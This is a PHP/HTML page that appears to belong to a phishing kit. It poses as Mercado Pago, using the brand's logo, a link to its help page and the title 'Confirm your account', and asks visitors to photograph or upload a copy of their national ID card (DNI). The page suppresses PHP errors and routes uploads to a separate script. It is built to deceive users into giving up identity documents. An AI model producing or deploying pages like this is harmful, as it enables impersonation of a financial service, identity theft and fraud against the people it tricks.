<?php
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Confirmá tu cuenta</title>
    <link rel="shortcut icon" href="fotes/logoo.ico" />
    <!--<META HTTP-EQUIV="REFRESH" CONTENT="5;URL=http://localhost/mg/index.php">-->
    <script src="https://kit.fontawesome.com/5b23b3e9e6.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" type="text/css" href="css/subirfoto.css">
</head>

<body>
    <div class="container">
        <div class="banner">
            <div class="img">
                <img src="fotes/mp.png" height="35" alt="">
            </div>
            <a href="https://www.mercadopago.com.ar/ayuda" class="pregunta"><i class="fas fa-question"></i></a>
        </div>
        <div class="body">
            <div class="formulario">
                <p>Necesitamos una copia de tu DNI</p>
                <div class="opciones">
                    <div class="opcion" id="opcion1">
                        <div class="icono">
                            <i class="fas fa-mobile-alt"></i>
                        </div>
                        <div class="texto">
                            <div class="principal">Sacar una foto desde mi celular</div>
                        </div>
                        <div class="flechita"><i class="fas fa-angle-right"></i></div>
                    </div>
                    <a href="fotocompu.php" class="opcion" id="opcion2">
                        <div class="icono">
                            <i class="fas fa-laptop"></i>
                        </div>
                        <div class="texto">
                            <div class="principal">Subir una foto desde mi computadora</div>
                        </div>
                        <div class="flechita"><i class="fas fa-angle-right"></i></div>
                    </a>
                </div>
            </div>
        </div>
    </div>
    </div>
    <script src="validar.js"></script>


</body>

</html>